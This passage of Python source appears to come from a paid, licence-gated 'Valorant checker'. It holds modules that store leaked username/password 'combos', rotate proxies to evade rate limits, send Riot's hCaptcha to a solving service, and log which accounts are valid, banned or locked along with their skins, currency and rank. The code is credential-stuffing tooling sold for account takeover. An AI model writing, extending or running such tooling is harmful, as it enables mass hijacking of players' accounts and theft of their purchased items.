    print(f"  (Don't have one? Purchase from: https://discord.gg/BmPKXpbYHK)\n")
    
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            license_key = input(f"  License Key: ").strip()
            
            if not license_key:
                print(f"  ❌ License key cannot be empty.\n")
                continue
            
            print(f"\n  🔐 Verifying license...")
            success, message, license_obj = license_mgr.verify_license(license_key)
            
            if success:
                # Save for future use
                license_mgr.save_license(license_key)
                print(f"  ✅ {message}")
                print(f"  License cached successfully!\n")
                return True
            else:
                print(f"  ❌ {message}")
                if attempt < max_attempts - 1:
                    print(f"  Attempts remaining: {max_attempts - attempt - 1}\n")
                
        except KeyboardInterrupt:
            print(f"\n\n  ❌ Authentication cancelled by user.")
            sys.exit(1)
        except Exception as e:
            print(f"  ❌ Error: {e}\n")
    
    # Max attempts reached
    print(f"\n{'='*60}")
    print(f"  ❌ AUTHENTICATION FAILED")
    print(f"  Maximum attempts reached. Please contact support.")
    print(f"  Discord: https://discord.gg/BmPKXpbYHK")
    print(f"{'='*60}\n")
    
    input("  Press Enter to exit...")
    sys.exit(1)


# =========================
# utils/logger.py
# =========================
import logging
from datetime import datetime
from typing import Optional, Callable
try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    # Fallback if colorama not installed
    COLORAMA_AVAILABLE = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = RESET_ALL = ''


class CheckerLogger:
    def __init__(self, log_callback: Optional[Callable] = None):
        self.log_callback = log_callback
        self.logger = logging.getLogger('ValorantChecker')
        self.logger.setLevel(logging.INFO)
        # Prevent propagation to root logger to avoid stdout/stderr encoding issues
        self.logger.propagate = False
        log_path = get_file_path('checker.log')
        file_handler = logging.FileHandler(log_path, encoding='utf-8')
        file_handler.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        if not self.logger.handlers:
            self.logger.addHandler(file_handler)
            # Also log to console with minimal formatting
            console_handler = logging.StreamHandler()
            console_handler.setLevel(logging.INFO)
            # Simple time-only format for console
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            self.logger.addHandler(console_handler)
        else:
            # Avoid duplicate handlers if this file is reloaded
            handler_types = {type(h) for h in self.logger.handlers}
            if logging.FileHandler not in handler_types:
                self.logger.addHandler(file_handler)
    
    def _log(self, level: str, message: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        # Sanitize message to avoid surrogate pairs/emoji issues in some environments
        try:
            safe_message = message.encode('utf-8', 'surrogatepass').decode('utf-8', 'ignore')
        except Exception:
            safe_message = message.encode('utf-8', 'ignore').decode('utf-8')
        
        # Skip verbose error/info messages from console
        skip_console = False
        skip_keywords = [
            'fetch error:', 'fetch exception:', 'Wallet fetch', 'Account level fetch',
            'MMR fetch', 'Loadout fetch', 'Agent entitlements', 'Contracts fetch',
            'Buddies fetch', 'Player cards fetch', 'Sprays fetch', 'Weapon skins fetch',
            'Skin chromas fetch', 'Skin levels fetch', 'Match history fetch', 
            'Account penalties fetch', 'Restrictions check error', 'Falling back to',
            'Entitlements API failed', 'ValorantAPI initialized', 'Got captcha rqdata',
            'Authentication successful', 'Agents from entitlements', 'Captcha required in new flow',
            'Claimed and loaded', 'Uploaded combos:', 'token length:', 'HTTPSConnectionPool',
            'Max retries exceeded', 'NameResolutionError', 'Failed to resolve', 'nodename nor servname'
        ]
        
        for keyword in skip_keywords:
            if keyword in safe_message:
                skip_console = True
                break
        
        # Custom emojis for better visibility
        EMOJI_SUCCESS = '✅'
        EMOJI_ERROR = '❌'
        EMOJI_WARNING = '⚠️ '
        EMOJI_CHECKING = '🔍'
        EMOJI_CAPTCHA = '🔐'
        EMOJI_RETRY = '🔄'
        EMOJI_INFO = '💠'
        
        # Color-coded console output based on level - using colorama
        if level == 'SUCCESS':
            console_msg = f"{Fore.GREEN}{Style.BRIGHT}{EMOJI_SUCCESS} {safe_message}{Style.RESET_ALL}"
        elif level == 'ERROR':
            console_msg = f"{Fore.RED}{Style.BRIGHT}{EMOJI_ERROR} {safe_message}{Style.RESET_ALL}"
        elif level == 'WARNING':
            console_msg = f"{Fore.YELLOW}{Style.BRIGHT}{EMOJI_WARNING}{safe_message}{Style.RESET_ALL}"
        elif level == 'CHECKING':
            console_msg = f"{Fore.CYAN}{EMOJI_CHECKING} {safe_message}{Style.RESET_ALL}"
        elif level == 'CAPTCHA':
            console_msg = f"{Fore.MAGENTA}{Style.BRIGHT}{EMOJI_CAPTCHA} {safe_message}{Style.RESET_ALL}"
        elif level == 'RETRY':
            console_msg = f"{Fore.YELLOW}{EMOJI_RETRY} {safe_message}{Style.RESET_ALL}"
        else:
            console_msg = f"{Fore.BLUE}{EMOJI_INFO} {safe_message}{Style.RESET_ALL}"
        
        # Log to file with standard format
        if level == 'INFO':
            self.logger.info(safe_message)
        elif level == 'ERROR':
            self.logger.error(safe_message)
        elif level == 'WARNING':
            self.logger.warning(safe_message)
        elif level == 'SUCCESS':
            self.logger.info(f"SUCCESS: {safe_message}")
        else:
            self.logger.info(safe_message)
        
        # Print color-coded to console (skip verbose messages)
        if not skip_console:
            print(console_msg)
            
        if self.log_callback:
            formatted_msg = f"[{timestamp}] {safe_message}"
            self.log_callback(formatted_msg, level)
    
    def info(self, message: str):
        self._log('INFO', message)
    
    def error(self, message: str):
        self._log('ERROR', message)
    
    def warning(self, message: str):
        self._log('WARNING', message)
    
    def success(self, message: str):
        self._log('SUCCESS', message)
    
    def valid_account(self, username: str, riot_id: str, details: str):
        msg = f"VALID • {riot_id} • {details}"
        self._log('SUCCESS', msg)
    
    def invalid_account(self, username: str, reason: str = "Invalid credentials"):
        # Map status codes to display format
        status_display = {
            "INCORRECT_LOGIN": "INVALID",
            "2FA": "2FA REQUIRED",
            "BANNED": "BANNED",
            "LOCKED": "LOCKED",
            "RATE_LIMITED": "RATE LIMITED",
            "CAPTCHA_FAILED": "CAPTCHA FAILED"
        }
        
        display_status = status_display.get(reason, reason)
        msg = f"{display_status} • {username}"
        
        # Use different log levels for different statuses
        if reason in ["BANNED", "LOCKED"]:
            self._log('WARNING', msg)
        else:
            self._log('ERROR', msg)
    
    def checking_account(self, username: str):
        msg = f"Checking • {username}"
        self._log('CHECKING', msg)
    
    def captcha_detected(self):
        msg = "Captcha detected"
        self._log('CAPTCHA', msg)
    
    def solving_captcha(self):
        msg = "Solving captcha..."
        self._log('CAPTCHA', msg)
    
    def retrying_captcha(self):
        msg = "Retrying captcha"
        self._log('RETRY', msg)
    
    def captcha_failed(self):
        msg = "Failed to solve captcha."
        self._log('ERROR', msg)
    
    def log(self, message: str, level: str = "INFO"):
        self._log(level, message)


# =========================
# utils/proxy.py
# =========================
import re
from typing import Optional, List
from itertools import cycle


class ProxyManager:
    def __init__(self):
        self.proxies: List[dict] = []
        self.proxy_cycle = None
        self.enabled = False
        self.failed_proxies: set = set()
    
    def parse_proxy(self, proxy_string: str) -> Optional[dict]:
        proxy_string = proxy_string.strip()
        if not proxy_string:
            return None
        
        # Format: http(s)://user:pass@ip:port or http(s)://ip:port
        if proxy_string.startswith('http://') or proxy_string.startswith('https://'):
            protocol = 'https' if proxy_string.startswith('https://') else 'http'
            rest = proxy_string.replace('https://', '').replace('http://', '')
            
            if '@' in rest:
                # user:pass@ip:port
                auth_part, server_part = rest.split('@', 1)
                proxy_url = f"{protocol}://{auth_part}@{server_part}"
            else:
                # ip:port
                proxy_url = f"{protocol}://{rest}"
            
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        
        # Format: ip:port:user:pass
        parts = proxy_string.split(':')
        if len(parts) == 4:
            ip, port, user, password = parts
            if port.isdigit():
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
        
        # Format: user:pass@ip:port
        if '@' in proxy_string:
            auth_part, server_part = proxy_string.split('@', 1)
            proxy_url = f"http://{auth_part}@{server_part}"
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        
        # Format: ip:port
        if len(parts) == 2 and parts[1].isdigit():
            ip, port = parts
            proxy_url = f"http://{ip}:{port}"
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        
        return None
    
    def load_proxies(self, proxy_list: List[str]) -> int:
        self.proxies = []
        for proxy_str in proxy_list:
            if not proxy_str or proxy_str.startswith('#'):
                continue
            parsed = self.parse_proxy(proxy_str)
            if parsed:
                self.proxies.append(parsed)
        if self.proxies:
            self.proxy_cycle = cycle(self.proxies)
            self.enabled = True
        else:
            self.enabled = False
        return len(self.proxies)
    
    def get_next_proxy(self) -> Optional[dict]:
        if not self.enabled or not self.proxy_cycle:
            return None
        return next(self.proxy_cycle)
    
    def get_different_proxy(self, failed_proxy: Optional[dict] = None) -> Optional[dict]:
        if not self.enabled or len(self.proxies) <= 1:
            return self.get_next_proxy()
        if failed_proxy:
            failed_proxy_url = failed_proxy.get('http', '') if failed_proxy else ''
            for _ in range(len(self.proxies)):
                next_proxy = next(self.proxy_cycle)
                next_proxy_url = next_proxy.get('http', '')
                if next_proxy_url != failed_proxy_url:
                    return next_proxy
        return next(self.proxy_cycle)
    
    def mark_proxy_failed(self, proxy: dict):
        if proxy:
            proxy_url = proxy.get('http', '')
            self.failed_proxies.add(proxy_url)
    
    def reset_failed_proxies(self):
        self.failed_proxies.clear()
    
    def disable(self):
        self.enabled = False
    
    def is_enabled(self) -> bool:
        return self.enabled and len(self.proxies) > 0


# =========================
# utils/country_mapper.py
# =========================

COUNTRY_MAPPING = {
    'esp': 'Spain', 'fra': 'France', 'deu': 'Germany', 'ita': 'Italy', 'gbr': 'United Kingdom',
    'pol': 'Poland', 'nld': 'Netherlands', 'swe': 'Sweden', 'nor': 'Norway', 'dnk': 'Denmark',
    'fin': 'Finland', 'aut': 'Austria', 'che': 'Switzerland', 'bel': 'Belgium', 'prt': 'Portugal',
    'cze': 'Czech Republic', 'hun': 'Hungary', 'rou': 'Romania', 'bgr': 'Bulgaria', 'hrv': 'Croatia',
    'svk': 'Slovakia', 'svn': 'Slovenia', 'est': 'Estonia', 'lva': 'Latvia', 'ltu': 'Lithuania',
    'grc': 'Greece', 'cyp': 'Cyprus', 'mlt': 'Malta', 'lux': 'Luxembourg', 'irl': 'Ireland', 'isl': 'Iceland',
    'mkd': 'North Macedonia', 'alb': 'Albania', 'srb': 'Serbia', 'mne': 'Montenegro', 'bih': 'Bosnia and Herzegovina',
    'ukr': 'Ukraine', 'blr': 'Belarus', 'rus': 'Russia', 'mda': 'Moldova',
    'usa': 'United States', 'can': 'Canada', 'mex': 'Mexico',
    'arg': 'Argentina', 'chl': 'Chile', 'col': 'Colombia', 'per': 'Peru', 'ven': 'Venezuela', 'ecu': 'Ecuador',
    'bol': 'Bolivia', 'pry': 'Paraguay', 'ury': 'Uruguay', 'cri': 'Costa Rica', 'pan': 'Panama', 'gtm': 'Guatemala',
    'hnd': 'Honduras', 'slv': 'El Salvador', 'nic': 'Nicaragua', 'dom': 'Dominican Republic', 'cub': 'Cuba',
    'jam': 'Jamaica', 'bra': 'Brazil',
    'kor': 'South Korea', 'jpn': 'Japan', 'chn': 'China', 'twn': 'Taiwan', 'hkg': 'Hong Kong', 'sgp': 'Singapore',
    'mys': 'Malaysia', 'tha': 'Thailand', 'vnm': 'Vietnam', 'phl': 'Philippines', 'idn': 'Indonesia', 'ind': 'India',
    'aus': 'Australia', 'nzl': 'New Zealand', 'pak': 'Pakistan', 'bgd': 'Bangladesh', 'lka': 'Sri Lanka',
    'mmr': 'Myanmar', 'khm': 'Cambodia', 'lao': 'Laos', 'brn': 'Brunei', 'mng': 'Mongolia', 'kaz': 'Kazakhstan',
    'uzb': 'Uzbekistan', 'kgz': 'Kyrgyzstan', 'tjk': 'Tajikistan', 'tkm': 'Turkmenistan', 'afg': 'Afghanistan',
    'irn': 'Iran', 'irq': 'Iraq', 'tur': 'Turkey', 'aze': 'Azerbaijan', 'arm': 'Armenia', 'geo': 'Georgia',
    'sau': 'Saudi Arabia', 'are': 'United Arab Emirates', 'qat': 'Qatar', 'kwt': 'Kuwait', 'bhr': 'Bahrain',
    'omn': 'Oman', 'yem': 'Yemen', 'jor': 'Jordan', 'lbn': 'Lebanon', 'syr': 'Syria', 'isr': 'Israel', 'pse': 'Palestine',
    'egy': 'Egypt', 'lby': 'Libya', 'tun': 'Tunisia', 'dza': 'Algeria', 'mar': 'Morocco', 'zaf': 'South Africa',
    'nga': 'Nigeria', 'ken': 'Kenya', 'eth': 'Ethiopia', 'gha': 'Ghana', 'uga': 'Uganda', 'tza': 'Tanzania',
    'moz': 'Mozambique', 'mdg': 'Madagascar', 'zmb': 'Zambia', 'zwe': 'Zimbabwe', 'bwa': 'Botswana', 'nam': 'Namibia',
    'ago': 'Angola', 'cod': 'Democratic Republic of Congo', 'cog': 'Republic of Congo', 'cmr': 'Cameroon',
    'civ': 'Ivory Coast', 'sen': 'Senegal', 'mli': 'Mali', 'bfa': 'Burkina Faso', 'ner': 'Niger', 'tcd': 'Chad',
    'caf': 'Central African Republic', 'sdn': 'Sudan', 'ssd': 'South Sudan', 'eri': 'Eritrea', 'som': 'Somalia', 'dji': 'Djibouti',
}


def get_country_name(country_code: str) -> str:
    if not country_code:
        return 'Unknown'
    code_lower = country_code.lower()
    return COUNTRY_MAPPING.get(code_lower, country_code.upper())


def get_country_code(country_name: str) -> str:
    if not country_name:
        return 'unknown'
    reverse_mapping = {v.lower(): k for k, v in COUNTRY_MAPPING.items()}
    return reverse_mapping.get(country_name.lower(), country_name.lower())


# =========================
# utils/memory_storage.py
# =========================
import threading
from typing import List, Tuple, Optional, Dict
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class ComboData:
    id: int
    username: str
    password: str
    status: str = 'pending'
    region: Optional[str] = None
    riot_id: Optional[str] = None
    level: Optional[int] = None
    vp: Optional[int] = None
    rd: Optional[int] = None
    skins: Optional[int] = None
    skin_details: Optional[List] = field(default_factory=list)
    agents: Optional[int] = None
    rank: Optional[str] = None
    email_verified: Optional[bool] = None
    phone_verified: Optional[bool] = None
    phone_status: Optional[str] = None
    email_status: Optional[str] = None
    country: Optional[str] = None
    puuid: Optional[str] = None
    buddies_count: Optional[int] = None
    buddies: Optional[List] = field(default_factory=list)
    player_cards_count: Optional[int] = None
    player_cards: Optional[List] = field(default_factory=list)
    sprays_count: Optional[int] = None
    sprays: Optional[List] = field(default_factory=list)
    weapon_skins_count: Optional[int] = None
    weapon_skins: Optional[List] = field(default_factory=list)
    skin_chromas_count: Optional[int] = None
    skin_chromas: Optional[List] = field(default_factory=list)
    skin_levels_count: Optional[int] = None
    skin_levels: Optional[List] = field(default_factory=list)
    total_matches: Optional[int] = None
    recent_matches: Optional[List] = field(default_factory=list)
    has_penalties: Optional[bool] = None
    penalty_status: Optional[str] = None
    penalties: Optional[List] = field(default_factory=list)
    created_at: datetime = field(default_factory=datetime.now)
    checked_at: Optional[datetime] = None


class MemoryStorage:
    def __init__(self, log_callback=None):
        self.log_callback = log_callback
        # Use list of dicts for better memory efficiency and faster lookups
        self._combos: List[dict] = []
        self._combo_index: Dict[int, int] = {}  # id -> index mapping for O(1) lookups
        self._username_password_set: set = set()  # For O(1) duplicate checking
        self._next_id = 1
        self._lock = threading.RLock()
    
    def _log(self, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(message, level)
    
    def add_combos(self, combos: List[Tuple[str, str]]) -> Tuple[int, List[dict]]:
        with self._lock:
            added = 0
            added_combos = []
            for username, password in combos:
                # Fast duplicate check using set
                combo_key = (username, password)
                if combo_key in self._username_password_set:
                    continue
                
                combo_dict = {
                    'id': self._next_id,
                    'username': username,
                    'password': password,
                    'status': 'pending',
                    'region': None,
                    'riot_id': None,
                    'level': None,
                    'vp': None,
                    'rd': None,
                    'skins': None,
                    'skin_details': [],
                    'agents': None,
                    'rank': None,
                    'email_verified': None,
                    'phone_verified': None,
                    'phone_status': None,
                    'email_status': None,
                    'country': None,
                    'puuid': None,
                    'buddies_count': None,
                    'buddies': [],
                    'player_cards_count': None,
                    'player_cards': [],
                    'sprays_count': None,
                    'sprays': [],
                    'weapon_skins_count': None,
                    'weapon_skins': [],
                    'skin_chromas_count': None,
                    'skin_chromas': [],
                    'skin_levels_count': None,
                    'skin_levels': [],
                    'total_matches': None,
                    'recent_matches': [],
                    'has_penalties': None,
                    'penalty_status': None,
                    'penalties': [],
                    'created_at': datetime.now(),
                    'checked_at': None
                }
                
                index = len(self._combos)
                self._combos.append(combo_dict)
                self._combo_index[self._next_id] = index
                self._username_password_set.add(combo_key)
                
                added_combos.append({
                    'id': self._next_id,
                    'username': username,
                    'password': password,
                    'status': 'pending'
                })
                self._next_id += 1
                added += 1
            return added, added_combos
    
    def get_pending_combos(self, limit: int = 100) -> List[Tuple[int, str, str]]:
        with self._lock:
            pending_combos = []
            count = 0
            for combo in self._combos:
                if combo.get('status') == 'pending' and count < limit:
                    pending_combos.append((combo['id'], combo['username'], combo['password']))
                    count += 1
            return pending_combos
    
    def claim_pending_combos(self, limit: int = 100) -> List[Tuple[int, str, str]]:
        with self._lock:
            claimed_combos = []
            count = 0
            for combo in self._combos:
                if combo.get('status') == 'pending' and count < limit:
                    combo['status'] = 'checking'
                    claimed_combos.append((combo['id'], combo['username'], combo['password']))
                    count += 1
            return claimed_combos
    
    def reset_checking_combos(self) -> int:
        with self._lock:
            reset_count = 0
            for combo in self._combos:
                if combo.get('status') == 'checking':
                    combo['status'] = 'pending'
                    reset_count += 1
            if reset_count > 0:
                self._log(f"Reset {reset_count} combos from 'checking' to 'pending'")
            return reset_count
    
    def update_combo_result(self, combo_id: int, result: dict):
        with self._lock:
            if combo_id in self._combo_index:
                index = self._combo_index[combo_id]
                if 0 <= index < len(self._combos):
                    combo = self._combos[index]
                    combo['status'] = result.get('status', 'invalid')
                    combo['region'] = result.get('region')
                    combo['riot_id'] = result.get('riot_id')
                    combo['level'] = result.get('level')
                    combo['vp'] = result.get('vp')
                    combo['rd'] = result.get('rd')
                    combo['skins'] = result.get('skins')
                    combo['skin_details'] = result.get('skin_details', [])
                    combo['agents'] = result.get('agents')
                    combo['rank'] = result.get('rank')
                    combo['email_verified'] = result.get('email_verified')
                    combo['phone_verified'] = result.get('phone_verified')
                    combo['phone_status'] = result.get('phone_status')
                    combo['email_status'] = result.get('email_status')
                    combo['country'] = result.get('country')
                    combo['puuid'] = result.get('puuid')
                    combo['buddies_count'] = result.get('buddies_count')
                    combo['buddies'] = result.get('buddies', [])
                    combo['player_cards_count'] = result.get('player_cards_count')
                    combo['player_cards'] = result.get('player_cards', [])
                    combo['sprays_count'] = result.get('sprays_count')
                    combo['sprays'] = result.get('sprays', [])
                    combo['weapon_skins_count'] = result.get('weapon_skins_count')
                    combo['weapon_skins'] = result.get('weapon_skins', [])
                    combo['skin_chromas_count'] = result.get('skin_chromas_count')
                    combo['skin_chromas'] = result.get('skin_chromas', [])
                    combo['skin_levels_count'] = result.get('skin_levels_count')
                    combo['skin_levels'] = result.get('skin_levels', [])
                    combo['total_matches'] = result.get('total_matches')
                    combo['recent_matches'] = result.get('recent_matches', [])
                    combo['has_penalties'] = result.get('has_penalties')
                    combo['penalty_status'] = result.get('penalty_status')
                    combo['penalties'] = result.get('penalties', [])
                    combo['checked_at'] = datetime.now()
    
    def mark_combo_failed(self, combo_id: int, status: str = 'invalid'):
        with self._lock:
            if combo_id in self._combo_index:
                index = self._combo_index[combo_id]
                if 0 <= index < len(self._combos):
                    combo = self._combos[index]
                    combo['status'] = status
                    combo['checked_at'] = datetime.now()
    
    def get_statistics(self) -> dict:
        with self._lock:
            total = len(self._combos)
            pending = sum(1 for combo in self._combos if combo.get('status') == 'pending')
            valid = sum(1 for combo in self._combos if combo.get('status') == 'valid')
            invalid = sum(1 for combo in self._combos if combo.get('status') == 'invalid')
            error = sum(1 for combo in self._combos if combo.get('status') == 'error')
            return {
                'total': total,
                'pending': pending,
                'valid': valid,
                'invalid': invalid,
                'errors': error,
                'checked': total - pending
            }
    
    def get_all_combos(self) -> List[dict]:
        with self._lock:
            # Return sorted copy of combos (sorted by created_at descending)
            # Create shallow copies to avoid external modifications
            results = []
            sorted_combos = sorted(self._combos, key=lambda x: x.get('created_at', datetime.min), reverse=True)
            for combo in sorted_combos:
                # Return a copy to prevent external modifications
                results.append(dict(combo))
            return results
    
    def get_valid_accounts(self) -> List[dict]:
        with self._lock:
            results = []
            valid_combos = [combo for combo in self._combos if combo.get('status') == 'valid']
            valid_combos.sort(key=lambda x: x.get('checked_at') or x.get('created_at', datetime.min), reverse=True)
            for combo in valid_combos:
                # Return a copy excluding internal fields
                result = dict(combo)
                # Remove internal tracking fields if needed
                results.append(result)
            return results
    
    def clear_storage(self):
        with self._lock:
            self._combos.clear()
            self._combo_index.clear()
            self._username_password_set.clear()
            self._next_id = 1
            self._log("Memory storage cleared")
    
    def get_combo_by_id(self, combo_id: int) -> Optional[dict]:
        with self._lock:
            if combo_id in self._combo_index:
                index = self._combo_index[combo_id]
                if 0 <= index < len(self._combos):
                    return dict(self._combos[index])  # Return copy
            return None


# =========================
# core/captcha.py
# =========================
import requests
import threading as _threading
import time as _time
from typing import Optional


class CaptchaSolver:
    # Class-level rate limiter (shared across all instances)
    _poll_lock = _threading.Lock()
    _last_poll_time = 0
    _min_poll_interval = 0.5  # Minimum 0.5 seconds between any two poll requests (shared across all threads)
    
    def __init__(self, api_key: str, log_callback=None):
        self.api_key = api_key
        self.log_callback = log_callback
    
    def _log(self, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(message, level)
    
    def get_balance(self) -> Optional[float]:
        """Get account balance from BroCapGPT"""
        try:
            response = requests.post(
                BROCAPGPT_GET_BALANCE_URL,
                json={'clientKey': self.api_key},
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('errorId') == 0:
                    return data.get('balance', 0.0)
                else:
                    error_code = data.get('errorCode', 'Unknown error')
                    self._log(f"Balance check error: {error_code}", "ERROR")
            else:
                self._log(f"Balance check error: HTTP {response.status_code} - {response.text}", "ERROR")
        except Exception as e:
            self._log(f"Error fetching balance: {e}", "ERROR")
        return None
    
    def solve_hcaptcha(self, rqdata: str, max_wait: int = 90, website_key: Optional[str] = None, website_url: Optional[str] = None) -> Optional[str]:
        """
        Solve hCaptcha using BroCapGPT API
        
        Args:
            rqdata: The rqdata parameter from Riot Games hCaptcha
            max_wait: Maximum time to wait for solution (seconds, default 90 per BroCapGPT docs: 10-80 seconds)
            website_key: hCaptcha sitekey (defaults to RIOT_WEBSITE_KEY)
            website_url: Website URL where captcha is solved (defaults to RIOT_WEBSITE_URL)
        
        Returns:
            gRecaptchaResponse token or None on failure
            Note: Token is valid for 60 seconds after completion (per BroCapGPT docs)
        """
        import time as _time
        
        # Use defaults if not provided
        website_key = website_key or RIOT_WEBSITE_KEY
        website_url = website_url or RIOT_WEBSITE_URL
        
        try:
            # Step 1: Create task
            task = {
                "type": "HCaptchaTask",
                "websiteURL": website_url,
                "websiteKey": website_key,
                "userAgent": RIOT_USER_AGENT,
                "data": rqdata,  # rqdata parameter for Riot Games
                "fallbackToActualUA": True
            }
            
            task_payload = {
                "clientKey": self.api_key,
                "task": task
            }
            
            self._log(f"💠 Solving Captcha...", "INFO")
            create_response = requests.post(
                BROCAPGPT_CREATE_TASK_URL,
                json=task_payload,
                timeout=30
            )
            
            if create_response.status_code != 200:
                self._log(f"Failed to create task: HTTP {create_response.status_code} - {create_response.text}", "ERROR")
                return None
            
            create_data = create_response.json()
            
            # Check for errors in task creation
            if create_data.get('errorId') != 0:
                error_code = create_data.get('errorCode', 'Unknown error')
                error_description = create_data.get('errorDescription', '')
                self._log(f"Task creation failed: {error_code}", "ERROR")
                if error_description:
                    self._log(f"Error details: {error_description}", "ERROR")
                # Log the full response for debugging
                import json as _json
                self._log(f"Full error response: {_json.dumps(create_data, indent=2)[:500]}", "DEBUG")
                return None
            
            task_id = create_data.get('taskId')
            if not task_id:
                self._log("No taskId in createTask response", "ERROR")
                return None
            
            self._log(f"Task created with ID: {task_id}, waiting for solution...", "INFO")
            
            # Step 2: Poll for result
            start_time = _time.time()
            poll_interval = 2  # Poll every 2 seconds (BroCapGPT requirement)
            consecutive_errors = 0
            max_consecutive_errors = 5  # Max errors before giving up
            
            while _time.time() - start_time < max_wait:
                # Rate limit polling requests across all threads
                with CaptchaSolver._poll_lock:
                    current_time = _time.time()
                    time_since_last_poll = current_time - CaptchaSolver._last_poll_time
                    if time_since_last_poll < CaptchaSolver._min_poll_interval:
                        sleep_time = CaptchaSolver._min_poll_interval - time_since_last_poll
                        _time.sleep(sleep_time)
                    CaptchaSolver._last_poll_time = _time.time()
                
                result_payload = {
                    "clientKey": self.api_key,
                    "taskId": task_id
                }
                
                result_response = requests.post(
                    BROCAPGPT_GET_TASK_RESULT_URL,
                    json=result_payload,
                    timeout=30
                )
                
                # Handle HTTP errors with proper backoff
                if result_response.status_code == 429:
                    # Rate limited - exponential backoff
                    consecutive_errors += 1
                    if consecutive_errors >= max_consecutive_errors:
                        self._log(f"Too many rate limit errors (HTTP 429), giving up", "ERROR")
                        return None
                    backoff_time = min(poll_interval * (2 ** consecutive_errors), 30)  # Max 30 seconds
                    self._log(f"Rate limited (HTTP 429), waiting {backoff_time}s before retry...", "WARNING")
                    _time.sleep(backoff_time)
                    continue
                elif result_response.status_code == 404:
                    # Task not found - might be expired or invalid
                    self._log(f"Task not found (HTTP 404) - task may have expired", "ERROR")
                    return None
                elif result_response.status_code != 200:
                    consecutive_errors += 1
                    if consecutive_errors >= max_consecutive_errors:
                        self._log(f"Too many errors (HTTP {result_response.status_code}), giving up", "ERROR")
                        return None
                    self._log(f"Failed to get task result: HTTP {result_response.status_code}", "ERROR")
                    _time.sleep(poll_interval)
                    continue
                
                # Reset error counter on successful request
                consecutive_errors = 0
                
                try:
                    result_data = result_response.json()
                except Exception as e:
                    self._log(f"Failed to parse response JSON: {e}", "ERROR")
                    _time.sleep(poll_interval)
                    continue
                
                # Check for errors
                if result_data.get('errorId') != 0:
                    error_code = result_data.get('errorCode', 'Unknown error')
                    # CAPTCHA_NOT_READY is expected while processing
                    if error_code == 'CAPTCHA_NOT_READY':
                        # Still processing, wait and retry
                        _time.sleep(poll_interval)
                        continue
                    elif error_code == 'ERROR_NO_SUCH_CAPCHA_ID' or error_code == 'WRONG_CAPTCHA_ID':
                        self._log(f"Task ID not found or expired: {error_code}", "ERROR")
                        return None
                    elif error_code == 'ERROR_CAPTCHA_UNSOLVABLE':
                        error_description = result_data.get('errorDescription', '')
                        self._log(f"Captcha unsolvable: {error_code}", "ERROR")
                        if error_description:
                            self._log(f"Error details: {error_description}", "ERROR")
                        return None
                    elif error_code == 'ERROR_DOMAIN_NOT_ALLOWED':
                        error_description = result_data.get('errorDescription', '')
                        self._log(f"Domain not allowed: {error_code}", "ERROR")
                        if error_description:
                            self._log(f"Error details: {error_description}", "ERROR")
                        self._log(f"This domain ({website_url}) may not be supported by BroCapGPT. Contact support if needed.", "ERROR")
                        return None
                    else:
                        # Other error codes when errorId != 0
                        error_description = result_data.get('errorDescription', '')
                        self._log(f"Task result error: {error_code}", "ERROR")
                        if error_description:
                            self._log(f"Error details: {error_description}", "ERROR")
                        return None
                
                # No errors (errorId == 0), check status
                status = result_data.get('status')
                
                if status == 'ready':
                    solution = result_data.get('solution', {})
                    g_recaptcha_response = solution.get('gRecaptchaResponse')
                    resp_key = solution.get('respKey')  # Optional: Value of hcaptcha.getRespKey()
                    user_agent_returned = solution.get('userAgent')  # UserAgent used during solving
                    
                    if g_recaptcha_response:
                        self._log(f"✅ Captcha solved successfully!", "INFO")
                        return g_recaptcha_response
                    else:
                        self._log("Solution ready but no gRecaptchaResponse in response", "ERROR")
                        return None
                
                elif status == 'processing':
                    # Still processing, wait and retry
                    _time.sleep(poll_interval)
                    continue
                else:
                    # Unknown status
                    self._log(f"Unknown status: {status}", "WARNING")
                    _time.sleep(poll_interval)
                    continue
            
            # Timeout (only reached if while loop exits)
            self._log(f"Captcha solving timed out after {max_wait} seconds", "ERROR")
            return None
            
        except requests.exceptions.Timeout as e:
            self._log(f"Captcha solving error: Request timed out - {e}", "ERROR")
            return None
        except requests.exceptions.ConnectionError as e:
            self._log(f"Captcha solving error: Connection failed - {e}", "ERROR")
            return None
        except Exception as e:
            self._log(f"Captcha solving error: {type(e).__name__} - {e}", "ERROR")
            return None


# =========================
# core/valorant_name_resolver.py
# =========================
from typing import Dict, Optional

RARITY_NAMES = {
    "0cebb8be-46d7-11e4-8350-000000000000": "Common",
    "e59aa87c-4cbf-517a-5983-6e81511be9b7": "Rare",
    "462e42a9-46d7-11e4-8350-000000000000": "Epic",
    "564d8012-46d7-11e4-8350-000000000000": "Legendary",
    "e8c92b9f-46d7-11e4-8350-000000000000": "Exclusive",
    "a8f7b8e0-46d7-11e4-8350-000000000000": "Premium"
}


class ValorantNameResolver:
    def __init__(self, log_callback=None):
        self.weapon_skins = {}
        self.buddies = {}
        self.player_cards = {}
        self.sprays = {}
        self.log_callback = log_callback
        self._load_static_data()
    
    def _log(self, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(message, level)
    
    def _load_static_data(self):
        """
        Load skin data from valorant-api.com - a public, community-maintained database
        of all Valorant skins, weapons, and cosmetics with images and metadata.
        API Documentation: https://valorant-api.com/
        """
        try:
            import requests as _requests
            # Load from public API - valorant-api.com provides comprehensive skin database
            resp = _requests.get("https://valorant-api.com/v1/weapons", timeout=15)
            if resp.status_code == 200:
                data = resp.json().get('data', [])
                for weapon in data:
                    for skin in weapon.get('skins', []):
